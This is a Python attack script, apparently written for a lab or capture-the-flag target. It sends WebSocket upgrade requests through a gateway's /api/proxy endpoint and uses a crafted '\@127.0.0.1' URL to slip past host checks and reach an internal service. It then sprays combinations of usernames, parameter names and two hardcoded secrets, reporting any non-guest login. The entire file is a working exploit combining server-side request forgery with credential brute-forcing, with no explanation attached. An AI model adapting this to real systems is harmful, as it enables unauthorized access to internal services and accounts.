import time, select, socket, base64, os, itertools, urllib.parse
from ws import recv_frame
GW=("127.0.0.1",24606)
INNER="http://rates.partner-forex.example.com\\@127.0.0.1:8081/ws"
TOK="9f2c7e14a6b3d508c1e04f7a2b8d6350a17e9c4b2d6f8035e1c9a7b4d2f60813"
SEED="9b62aed8c3d31cc08cb70535ee8917176125acc68bf3191617773c452d16cc48"
pairs=[("user","pass"),("username","password"),("partner","token"),("partner_id","secret"),
("id","key"),("client_id","client_secret"),("u","p"),("user","token"),("partner","secret")]
def trial(qs):
    s=socket.create_connection(GW,timeout=8)
    req=(f"GET /api/proxy?url={INNER}&{qs} HTTP/1.1\r\nHost: x\r\n"
         "Upgrade: websocket\r\nConnection: Upgrade\r\n"
         f"Sec-WebSocket-Key: {base64.b64encode(os.urandom(16)).decode()}\r\nSec-WebSocket-Version: 13\r\n\r\n")
    s.sendall(req.encode()); buf=b""
    while b"\r\n\r\n" not in buf:
        c=s.recv(1)
        if not c: break
        buf+=c
    s.setblocking(False); out=[]; end=time.time()+0.8
    while time.time()<end:
        r,_,_=select.select([s],[],[],0.08)
        if r:
            try: out.append(recv_frame(s)[1])
            except Exception: break
    s.close(); return out
hit=0
for u,p in pairs:
    for user in ["ops","admin","partner"]:
        for pw in [TOK,SEED]:
            qs=f"{u}={user}&{p}={pw}"
            out=trial(qs)
            rdy=[x for x in out if isinstance(x,bytes) and x.startswith(b"READY")]
            if rdy and rdy[0]!=b"READY guest":
                print("HIT",qs,rdy,flush=True); hit+=1
print("hits",hit)
